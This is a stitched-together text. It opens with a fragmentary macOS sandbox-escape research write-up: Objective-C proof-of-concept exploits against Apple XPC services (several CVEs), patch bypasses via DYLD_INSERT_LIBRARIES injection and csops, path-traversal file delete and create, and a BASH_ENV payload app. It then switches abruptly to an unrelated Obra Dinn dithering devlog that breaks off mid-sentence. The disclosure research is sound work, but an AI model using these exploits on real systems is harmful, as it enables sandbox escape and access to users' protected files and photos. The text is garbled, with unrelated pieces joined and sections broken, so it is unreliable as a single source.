<p>(Another simple solution is to archive the payload application twice. Abusing the vulnerable XPC method to unpack the external zip file and then using the system <code>open</code> command to unpack the inner zip file.)</p>

<p>The exploit code is as follows:</p>

<div><pre><code>@protocol TrialArchivingServiceProtocol &lt;NSObject&gt;
- (void) extractArchiveFromHandle:(NSFileHandle *)archiveHandle withArchiveName:(NSString *)archiveName toDirectory:(NSURL *)dstURL destDirExtension:(NSString *)destDirToken postExtractionCompression:(unsigned long long)post completion:(void (^)(unsigned char))reply;

<p>This XPC method helps to unarchive an item passed from a sandboxed application to a specified location. However, it doesn’t pass the quarantine extended attribute to the extracted content.

<p>The XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>Moreover, it also has the special TCC entitlement in its code signature for <strong>Full Disk Access</strong>:</p>

<h3 id="the-issue-5">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/Frameworks/ImageCaptureCore.framework/XPCServices/mscamerad-xpc.xpc
</code></pre></div>

<p>Similarly, the XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>What’s more, it has the special TCC entitlement in its code signature to access the <strong>Photos</strong> and <strong>Removable Volumes</strong> directly without prompting the users:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151150288.png" alt="image-20241020151150288"></p>

<p>Therefore, it can also be exploited to bypass these TCC protections at the same time!</p>

<p>The main logic is to listen at the service named “<strong>com.apple.mscamerad-xpc</strong>”.</p>

<p>Similarly, this XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151313353.png" alt="image-20241020151313353"></p>

<p>The <code>ICXPCDeviceManagerProtocol</code> has six methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151341184.png" alt="image-20241020151341184"></p>

<p>Specially, the XPC method “<code>openDevice:withReply:</code>” is designed to open and construct a new <code>MSCameraDevice</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151437728.png" alt="image-20241020151437728"></p>

<p>During the initialization of the new device, it listens at another anonymous XPC service to provide some service routines for the new camera device:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151501301.png" alt="image-20241020151501301"></p>

<p>The anonymous XPC service accepts all the incoming XPC clients by returning YES in the camera device’s delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151531992.png" alt="image-20241020151531992"></p>

<p>The <code>ICCameraDeviceProtocol</code> has 23 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151608007.png" alt="image-20241020151608007"></p>

<p>The issue exists in the XPC method “<code>requestReadDataFromObjectHandle:options:withReply:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151651506.png" alt="image-20241020151651506"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151705732.png" alt="image-20241020151705732"></p>

<p>It reads the file content for the requested file item and replies the file content data to the XPC client. The requested file path is controlled from the XPC client. So a sandboxed application can exploit this XPC method to read an arbitrary file outside of the sandbox container.</p>

<p>At the same time, the sandboxed app can also read the user’s <strong>Photos</strong> directly without prompting the users due to the service’s powerful TCC entitlements.</p>

<h3 id="the-exploit-and-demo-5">The exploit and demo</h3>

<p>In order to trigger the vulnerability, we need to prepare the camera device and the camera file.</p>

<p>Through my research, I discovered that the <strong>MSCameraDevice</strong> can be emulated by creating a DMG file and mounting it.</p>

<p>Next, if a file path in the DMG volume matches the special <strong>regular expression</strong>, then the file item will be indexed as an <strong>ICCameraFile</strong> and the file data can be requested via the vulnerable XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152029416.png" alt="image-20241020152029416"></p>

<div><pre><code>folderNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^([1-9]{1}[\\d]{2}[\\w]{5})$|^((?i)\\bDCIM\\b)$" options:16 error:0];// e.g. 123abcde, DCIM, dcIm, ...
fileNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^[\\w]{4}(E){0,1}(\\d){4}\\.(([\\w]){3}|HEIC)$" options:16 error:0];// e.g. abcd1234.mp3, 1234E5678.HEIC
</code></pre></div>

<p>So we can make a fake camera device and camera file like this:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152230512.png" alt="image-20241020152230512"></p>

<p>A sandboxed application could drop the DMG file and then open the DMG file to mount it to trigger the issue.</p>

<p>The XPC client has already been implemented in the ImageCaptureCore framework. The exploit code is as follows:</p>

<div><pre><code>@interface MyDeviceDelegate : NSObject&lt;ICCameraDeviceDelegate&gt;
@end
@implementation MyDeviceDelegate
- (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray&lt;ICCameraItem *&gt; *)items { 
    NSLog(@"didAddItems");
    for (ICCameraFile *item in items) {
        NSLog(@"new file item:%@", item); // TODO: I should check the item type(file/folder) and item name here.
        [item requestReadDataAtOffset:0 length:item.fileSize completion:^(NSData *data, NSError *err) {
            NSLog(@"Got file data:%@ (%@)", data, [NSString stringWithCString:[data bytes] encoding:NSUTF8StringEncoding]);
        }];
    }
}
@end
@interface MyDeviceBrowserDelegate : NSObject&lt;ICDeviceBrowserDelegate&gt;
@end
@implementation MyDeviceBrowserDelegate
- (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing { 
    NSLog(@"didAddDevice:%@", device);
    device.delegate = devDelegate; // instance of MyDeviceDelegate
    [device requestOpenSession];
}
@end
void exploit(void) {
    ICDeviceBrowser *deviceBrowser = [[ICDeviceBrowser alloc]init];
    MyDeviceBrowserDelegate *browserDelegate = [[MyDeviceBrowserDelegate alloc]init];
    deviceBrowser.delegate = browserDelegate;
    [deviceBrowser start];
}
</code></pre></div>

<h3 id="the-patch-1">The patch 1</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14 by adding a new check in the function <code>acceptConnection:</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152404523.png" alt="image-20241020152404523"></p>

<p>The check function returns <strong>OK</strong> if the incoming XPC client meets one of the following <strong>two conditions</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152502353.png" alt="image-20241020152502353"></p>

<ul>
  <li>Return OK if the client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</li>
  <li>Return OK <strong>if the client is a platform binary!</strong></li>
</ul>

<h3 id="the-bypass-1">The bypass 1</h3>

<p>The second condition doesn’t make any sense because the <strong>platform binary</strong> is not trustworthy and <strong>easy to inject</strong>! Then I reported the new issue to Apple. As a result, Apple assigned <strong>CVE-2024-23253</strong> to this bypass report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152721547.png" alt="image-20241020152721547"></p>

<p>Here’s how I bypassed the patch to access the TCC-protected contents:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li>Talk to the XPC service as before</li>
</ol>

<h3 id="the-patch-2">The patch 2</h3>

<p>Apple patched the issue again in macOS 14.4 by hardening the second condition:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153333113.png" alt="image-20241020153333113"></p>

<table>
  <tbody>
    <tr>
      <td>From the new patch code, we can see that it requires the XPC client to not only be the <strong>platform binary</strong>, but also to be signed with the flags: “**CS_REQUIRE_LV</td>
      <td>CS_FORCED_LV**”.</td>
    </tr>
  </tbody>
</table>

<h3 id="the-bypass-2">The bypass 2</h3>

<p>Apple thought that the new required flags would kill the dynamic library injection exploits. But they were wrong. The checks here can still be bypassed! Again, I reported the new bypass to Apple and they assigned the new CVE-2024-40831 for it:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153456843.png" alt="image-20241020153456843"></p>

<p>Here’s how I exploited it again:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li><strong>Set the required flags manually</strong></li>
  <li>Talk to the XPC service as before</li>
</ol>

<p>Compared to the previous exploit, only one additional step has been added. After injecting into the platform binary “<code>ls</code>” command, the exploit process doesn’t have the required flags. However, the desired flags can be set manually at runtime via the system API “<code>csops</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153657853.png" alt="image-20241020153657853"></p>

<p>As a result, the exploit process will bypass all the checks and talk to the XPC service as before!</p>

<h3 id="the-patch-3">The patch 3</h3>

<p>Apple patched this issue again in macOS Sequoia 15:</p>

<p>Now, It will approve the XPC connection, only if the XPC client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</p>

<p>The <code>INHServing</code> protocol has 11 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153859143.png" alt="image-20241020153859143"></p>

<p>There is a path traversal issue in the function named “<code>filePathForImageWithFileName</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154451538.png" alt="image-20241020154451538"></p>

<p>The function parameter <code>fileName</code> is an arbitrary string, that can be controlled by the XPC client.</p>

<p>This vulnerable function can be reached from two XPC methods:</p>

<p>The first XPC method is named “<code>retrieveImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154537678.png" alt="image-20241020154537678"></p>

<p>It can be abused to read an arbitrary file with extension “<code>.png</code>”, and the retrieved data will be stored in a member variable of the “<code>INImage</code>” instance and replied to the XPC client.</p>

<p>The second XPC method is named “<code>purgeImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154636438.png" alt="image-20241020154636438"></p>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the input string from the XPC client:</p>

<p>The special characters used for path traversal will be trimmed.</p>

<h2 id="cve-2024-27864">CVE-2024-27864</h2>

<p>The CVE entry is waiting to be published.</p>

<h3 id="the-issue-7">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/DiskImages2.framework/XPCServices/diskimagescontroller.xpc
</code></pre></div>

<p>This XPC service is powerful because it has the special entitlement “<strong>com.apple.diskimages.creator-uc</strong>” in its code signature:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155146714.png" alt="image-20241020155146714"></p>

<p>This entitlement has two main functions:</p>

<ul>
  <li>Talk to <code>/usr/libexec/diskimagesiod</code>, which has the <strong>FDA</strong> entitlement and does the real attach job.</li>
  <li>Connect to the IOKit Service “<strong>AppleDiskImagesController</strong>” (<code>/System/Library/Extensions/AppleDiskImages2.kext</code>), which <strong>creates</strong> and <strong>quarantines</strong> a device for a DMG file.</li>
</ul>

<p>Similarly, the XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155625758.png" alt="image-20241020155625758"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155632557.png" alt="image-20241020155632557"></p>

<p>The <code>DIControllerProtocol</code> has 10 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155720932.png" alt="image-20241020155720932"></p>

<p>The first issue exists in the XPC method named “<code>attachWithParams:reply:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155804040.png" alt="image-20241020155804040"></p>

<p>At line 12, it calls the function “<code>checkAttachEntitlementWithError</code>”. As the name implies, the checker function should check the entitlement of the incoming XPC client. However, it always returns <strong>TRUE</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155850857.png" alt="image-20241020155850857"></p>

<p>The XPC client has already been implemented in the <code>DiskImages2.framework</code> as the objective-c class <strong>DIAttachParams</strong>. And the XPC connection can be established via the method “<code>-[DIAttachParams newAttachWithError:]</code>”. So I could reuse the framework code directly like this to attach a DMG volume without reinventing the wheels:</p>

<div><pre><code>NSError *error=nil;
DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"quarantined_payload.dmg"] error:&amp;error];
[params newAttachWithError:&amp;error];
</code></pre></div>

<p>However, I discovered that the <strong>client code</strong> in the framework will <strong>check</strong> whether the input URL is quarantined:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020160238432.png" alt="image-20241020160238432"></p>

<p>If the input URL is quarantined, it will set the <strong>quarantine parameter</strong> before invoking the XPC method to attach. This will notify the XPC service to quarantine the target device.</p>

<p>So in my own XPC client, I can <strong>skip the quarantine parameter setting</strong> and invoke the XPC method to attach directly. As a result, the XPC service will <strong>attach a quarantined DMG file without quarantining the corresponding device</strong>.</p>

<h3 id="the-exploit-and-demo-7">The exploit and demo</h3>

<p>In order to skip setting the quarantine parameter, I have to <strong>rewrite the XPC client code</strong> by myself:</p>

<div><pre><code>@protocol DIControllerProtocol
- (void)dupWithStderrHandle:(NSFileHandle *)arg1 reply:(void (^)(NSError *))arg2;
- (void)attachWithParams:(DIAttachParams *)arg1 reply:(void (^)(NSError *))reply;
@end
@interface DIController2Client : NSObject&lt;DIController2ClientProtocol&gt;
@end
@implementation DIController2Client
- (void)attachCompletedWithHandle:(NSFileHandle *)handle reply:(void (^)(NSError *))reply {
    NSLog(@"attachCompletedWithHandle:%@", handle);
    system("open /Volumes/.exploit/poc.app"); // launch the app from the payload.dmg (unquarantined mounting)
    reply(0);
}
@end
void exploit_diskimages2(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/DiskImages2.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.diskimagescontroller"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIControllerProtocol)];
    conn.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIController2ClientProtocol)];
    conn.exportedObject = [[DIController2Client alloc]init];
    [conn resume];
    id proxy = [conn remoteObjectProxy];
    
    // [proxy dupWithStderrHandle:[NSFileHandle fileHandleWithStandardError] reply:^(NSError *err) {}];
    DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"payload.dmg"] error:nil];
    [proxy attachWithParams:params reply:^(NSError *err) { // the quarantined payload.dmg (dropped by this sandboxed app) will be attached without being quarantined!
        NSLog(@"attach error:%@", err);
    }];
}
</code></pre></div>

<h3 id="the-patch-6">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.4 by <strong>moving the verification logic from the client side to the server side</strong>.</p>

<p>It will quarantine the corresponding device directly from the server, if the input file path is quarantined.</p>

<h2 id="cve-2023-42977">CVE-2023-42977</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173015038.png" alt="image-20241019173015038"></p>

<h3 id="the-issue-8">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/PowerlogCore.framework/XPCServices/PerfPowerServicesSignpostReader.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162727212.png" alt="image-20241020162727212"></p>

<p>The <code>XPCSignpostReaderProtocol</code> has 6 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162915916.png" alt="image-20241020162915916"></p>

<p>However, Apple has only implemented one XPC method named “<code>submitSignpostDataWithConfig:withReply:</code>”, the other 5 XPC methods are empty implementations.</p>

<p>The core logic of this XPC method is to collect the log data and archive it to a gzip file. It seems that the log archive data will later be submitted to the Apple servers. However, there is a path traversal issue in this XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163019774.png" alt="image-20241020163019774"></p>

<p>Because the variable “<code>tagUUID</code>” is an arbitrary string, that can be controlled by the XPC client. The “<code>powerlog</code>” path can be hijacked to an arbitrary path.</p>

<h3 id="the-exploit-and-demo-8">The exploit and demo</h3>

<h4 id="the-exploit-1-arbitrary-path-delete">The Exploit 1: Arbitrary Path Delete</h4>

<p>At line 160 of the function:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163201932.png" alt="image-20241020163201932"></p>

<p>It calls the method named “<code>archiveDirectoryAt:deleteOriginal:</code>” which will delete the “<code>powerlog</code>” path. So this gives the attacker a primitive to remove an arbitrary path:</p>

<div><pre><code>    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @"taskingAllowlist":@{},
        @"taskingStartDate":[NSDate now],
        @"taskingEndDate":[NSDate now],
        @"taskingSubmitSP":@0,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@", path]
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
</code></pre></div>

<h4 id="the-exploit-2-arbitrary-directory-create-and-full-sandbox-esacpe">The Exploit 2: Arbitrary Directory Create and Full Sandbox Esacpe</h4>

<p>Moreover, at line 41 of the function “<code>createSignpostFile:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163334261.png" alt="image-20241020163334261"></p>

<p>It creates the directory at the “<code>powerlog</code>” path. So this gives the attacker a primitive to create an arbitrary directory:</p>

<div><pre><code>@protocol XPCSignpostReaderProtocol &lt;NSObject&gt;
- (void) submitSignpostDataWithConfig:(id)config withReply:(void (^)(id))arg2;
@end
void my_create_path(NSString *path) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/PowerlogCore.framework"]load];
    conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.PerfPowerServicesSignpostReader"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCSignpostReaderProtocol)];
    [conn resume];
    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @“taskingAllowlist":@{}, @"taskingStartDate":[NSDate now], @"taskingEndDate":[NSDate now], @“taskingSubmitSP":@1,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@/logarchive", path],
            …
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
}
</code></pre></div>

<p>In fact, <strong>the primitive to create an arbitrary directory without the quarantine extended attribute can lead to a full sandbox escape</strong>.</p>

<p>Here, I used the trick from <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>:</p>

<div><pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *currentDir = NSHomeDirectory();
    NSString *payloadPath = [currentDir stringByAppendingPathComponent:@"payload"];
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:payloadPath atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
    NSString *myapp = [currentDir stringByAppendingPathComponent:@"poc.app"];
    my_create_path(myapp); // create .app folder without being quarantined
    
    mkdir("poc.app/Contents", 0777);
    mkdir("poc.app/Contents/MacOS", 0777);
    symlink("/bin/bash", "poc.app/Contents/MacOS/poc");
    NSString *cmd = [NSString stringWithFormat:@"defaults write \"%@/poc.app/Contents/Info\" LSEnvironment -dict-add BASH_ENV \"%@\"", currentDir, payloadPath];
    system([cmd UTF8String]);
    system("open ./poc.app");
}
</code></pre></div>

<h3 id="the-patch-7">The patch</h3>

<h3 id="one-more-thing">One More Thing</h3>

<p>I submitted this report to Apple:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164839630.png" alt="image-20241020164839630"></p>

<p>Apple deemed it an expected behavior and closed the report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164854324.png" alt="image-20241020164854324"></p>

<p>I can understand why Apple thinks this is an expected behavior. Because the newly launched application is not in the context of the current process and it cannot share entitlements or privileges that the current process may have.</p>

<h3 id="my-thoughts">My thoughts</h3>

<ul>
  <li>The <strong>App Sandbox</strong>: dropped files are quarantined <strong>by default</strong>.</li>
  <li>The <strong>Service Sandbox</strong>: dropped files are <strong>not quarantined by default.</strong></li>
  <li>
    <ul>
      <li>
        <ul>
          <li>Not a flaw: The newly launched process is <strong>not in the current service execution context</strong>, and thus can’t share the entitlements/privileges of the current service.</li>
          <li>It’s a flaw: Once an attacker get the remote code execution (RCE) in a sandbox-restricted service context (e.g., <strong>IMTranscoderAgent, 0-click exploited by NSO Group</strong>), he can drop and launch a new non-sandboxed application to get rid of the sandbox restriction of the target service (<strong>IMTranscoderAgent</strong>).</li>
          <li>e.g., “<code>com.apple.WebDriver.HTTPService.xpc</code>” calls the API “<strong>WBSEnableSandboxStyleFileQuarantine</strong>” manually.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Escape from the <strong>App Sandbox</strong> to the <strong>Service Sandbox</strong> == <strong>Non Sandbox</strong> (<strong>macOS Only</strong>)</li>

<div id="readability-page-1" class="page"><div><p><b><span size="5">Fullscreen, Round 3</span></b></p><p>Thanks everybody for all the suggestions. I tried everything, literally, and concluded that the best way to maintain the game's style and fix the fullscreen discomfort was to stabilize the swimming dither and subdue the flickering dots. I got there in the end, with a few compromises. This is the 3rd full devlog post I've written on this. For each previous version I'd get an idea or find something else to try while checking over it. At this point, don't even care.</p><p><span size="5"><b>Dithering Process</b></span></p><p>First, a quick explanation. Obra Dinn renders everything internally in 8-bit grayscale then converts the final output to 1-bit in a post-processing pass. The conversion from 8-bit to 1-bit is handled by comparing each source image's pixel to the corresponding dot in a tiling dither pattern. If the image pixel value&nbsp;is greater than the dither pattern dot value, the output bit is set to 1. Otherwise it's 0. The output gets reduced to 1-bit and the viewer's eye will merge the pixels back together to approximate more bits.</p><p><img src="http://3909.co/dev/od/img/Dither2-Exp.png" alt=""></p><p>Thresholding a source image by a dither pattern</p><p>The two components of this process are the source image and the dither pattern. Obra Dinn uses two distinct patterns for different cases: an 8x8 bayer matrix for a smoother range of shades,&nbsp;and a 128x128 blue noise field for a less ordered output.</p><p><img src="http://3909.co/dev/od/img/Dither2-ExpPatterns.png" alt=""></p><p>bayer / blue noise</p><p><img src="http://3909.co/dev/od/img/Dither2-Exp2.png" alt=""></p><p>In-engine result without wireframe lines. Bayer on the sphere, blue noise everywhere else.</p><p><b><span size="5">Hold Still Please</span></b></p><p>The basic dithering process works great for static images and much less great for moving or animated images. When&nbsp;the source image changes from frame-to-frame&nbsp;the static dither pattern and low resolution output&nbsp;become a major problem.&nbsp;What should be solid shapes and shades now read as a wiggling mess of pixels.</p><p><img src="http://3909.co/dev/od/img/Dither2-ExpMoving.gif" alt=""></p><p>Moving the sphere</p><p>These days,&nbsp;dithering is mostly used when the source image is either static or the output has a&nbsp;high resolution. The first thought when seeing this low-res swimming dither effect is not "yeah that's how dither works" but "what is this warping shaking effect and how can I turn it off."</p><p><img src="http://3909.co/dev/od/img/Dither2-Original.gif" alt=""></p><p>Exhibit A. Reduced contrast for your comfort.</p><p>Try to focus on something here when it moves and behold&nbsp;the&nbsp;crinkled&nbsp;heart of Obra Dinn's fullscreen problems. There are ways to fix this that mostly&nbsp;boiling down to "this style doesn't work, change it." I went pretty far down that path, experimenting with different styles, before swinging back and wondering if maybe I shouldn't let these bullshit little pixels push me around.</p><p><b><span size="5">Stabilizing The Dither</span></b></p><p>To give&nbsp;your eyes the best chance at recombining everything, dithering works best when the dither pattern&nbsp;dots have a 1:1 correlation with the output pixels. But, correlating&nbsp;only&nbsp;with the output means that as a scene post effect there's no connection&nbsp;between the geometry being rendered and the pattern that thresholds it. Each frame, moving scene elements threshold against different values. What I want instead is for the dither pattern to be "pinned" to the geometry and to appear stable as it moves with the rest of the scene.</p><p>The core of this is a mapping problem. As told&nbsp;by the length of this post, there's a conflict between the&nbsp;ideal&nbsp;dither pattern mapping (1:1 with the screen) and the&nbsp;ideal scene mapping (x:1 with the geometry) so get ready for some compromises.&nbsp;Most of my work was focused on mapping the input&nbsp;dither pattern into different spaces&nbsp;that better correlate the pattern with the scene geometry. Everything here is done at the pre-thresholding stage.</p><p><span size="5">Texel Space</span></p><p>My first try was to map the dither pattern in texel space. This is equivalent to dithering the object textures during scene rendering instead of in a post-processing pass on the 8-bit output. I didn't expect this to work well but wanted to see what a perfectly scene-matched mapping looked like anyways.</p><p><img src="http://3909.co/dev/od/img/Dither2-TexelMap.png" alt=""></p><p>Dither pattern in texel space</p><p>Ok well, expectations solidly met. The objects are all mapped differently so their pattern scales don't match. Those could be unified. The real problem is the aliasing. Any resampling&nbsp;from one space to another like this will result in aliasing, and dither patterns can't be easily mipped&nbsp;or filtered like traditional textures. Still, to carry it through:</p><p><img src="http://3909.co/dev/od/img/Stable-Texel.gif" alt=""></p><p>Applied to the moving scene</p><p>This isn't a total loss - the&nbsp;pattern is nicely pinned to geometry. The aliasing produces its own swimming effect and unifying or scaling the mappings won't help with that.&nbsp;Texels&nbsp;change size with distance from the camera so there will always be&nbsp;dither pattern pixels that alias badly when resampled to the screen.</p><p><span size="5">Motion Warping</span></p><p>If I want the dither pattern to track the moving geometry beneath it, why not just warp the pattern using the change in position of each rendered pixel in the scene? Indeed why not. This is a bit like a motion blur, where each pixel tracks its movement from the previous frame. In this case, I update the dither texture to keep its pattern moving with the scene. If a scene pixel was not represented in the previous frame, the dither pattern is reloaded&nbsp;there. This&nbsp;technique is made much simpler by the game's static-ness - I only need to worry about the movement of the camera, not individual objects.</p><p><img src="http://3909.co/dev/od/img/Stable-Warp.gif" alt=""></p><p>Warping the dither pattern to maintain frame-to-frame coherence with&nbsp;the scene</p><p>This was a pretty quick &amp; dirty try but a few things are clear. First, it kinda works. Second, a dither pattern needs a neighborhood - it can't be individual pixels. If you consider each pixel individually, as this method does, then you'll get breaks and discontinuities in the pattern which are obvious. I shifted the camera in this test scene to highlight those on the chest here. Viewing the warped dither pattern itself&nbsp;makes this a little easier to see.</p><p><img src="http://3909.co/dev/od/img/Stable-WarpMapping.gif" alt=""></p><p>Thresholding solid gray with the warping dither pattern</p><p>These discontinuities are down to the differing pixel depths and&nbsp;thresholds that I chose. I reasoned an elaborate fix based on tracking regions, averaging their depth and shifting all dither pattern dots in that region by the same amount. A discontinuity along a region boundary could be hidden by sharp lighting changes or a wireframe line.&nbsp;This would've been enabled by the game's existing setup of colored regions for the wireframe generation. When I sat down to implement all that, the depth term dropped out of the first&nbsp;equation I came up with and gave me a much simpler alternative:</p><p><span size="5">Screen-mapping&nbsp;With Offset</span></p><p>When putting together the equations for the warping dither, a very simple transform fell out:</p><p>DitherOffset =&nbsp;ScreenSize * CameraRotation / CameraFov<br></p><p><img src="http://3909.co/dev/od/img/Dither2-ShiftingExp.gif" alt=""></p><p>Shifting the screen-mapped dither pattern based on camera rotation</p><p>Basically, this expresses that I want the screen-mapped dither pattern to shift by exactly one screen&nbsp;when the camera rotates through one field of view. That maintains a 1:1 mapping with the screen while also considering a simplified transform of the scene geometry in view. This really only matches the movement at the center of the screen but bless this fucked up world because it's nearly good enough.</p><p><img src="http://3909.co/dev/od/img/Dither2-Shifting.gif" alt=""></p><p>Offsetting the dither pattern to track one screen per camera fov rotation</p><p>Note how the dithered pixels on the chair appear to mostly move with the geometry. Likewise for the sphere. Planes more perpendicular to the view don't match very well;&nbsp;the floor is still a mess.</p><p>So while not being perfect, simply shifting the screen-mapped dither keeps&nbsp;the overall pattern and scene&nbsp;movement close enough that the eyes can better track them together. I was pretty happy with this. While cleaning up the code and committing everything, maybe writing a devlog post or two, the idea of a&nbsp;perfectly-pinned dither kept nagging at me:</p><p><span size="5">World&nbsp;Space - Cube Mapping</span></p><p>The experiments so far suggest&nbsp;that&nbsp;any&nbsp;correlation between the dither pattern and scene geometry would have to ignore depth information from the scene. What this means practically is that the dither can be pinned to the geometry during camera rotation but not during camera translation. This isn't such a bad thing for Obra Dinn considering the slow pace of the game and the observational&nbsp;role of the player. You're normally walking around, stopping, and 